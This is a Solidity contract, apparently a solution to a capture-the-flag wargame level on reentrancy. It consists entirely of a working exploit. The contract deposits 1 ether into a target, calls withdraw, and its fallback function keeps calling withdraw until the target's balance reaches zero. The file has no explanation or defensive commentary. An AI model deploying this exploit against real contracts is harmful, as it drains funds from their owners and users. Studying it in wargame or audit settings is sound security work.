pragma solidity ^0.8.0;

interface IReentrancy {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract AttackReentrancy {
    address reentrancyAddress = YOUR_INSTANCE_ADDRESS;
    IReentrancy reentrancyContract = IReentrancy(reentrancyAddress);
    uint public amount = 1 ether;
    
    //Seed contract with 1 ether
    constructor() payable {
    }
    
    function pwn() public {
        reentrancyContract.donate{value: 1 ether}(address(this));
        reentrancyContract.withdraw(amount);
    }
    
    fallback() external payable {
        if (address(reentrancyContract).balance != 0 ) {
        reentrancyContract.withdraw(amount); 
        }
    }
}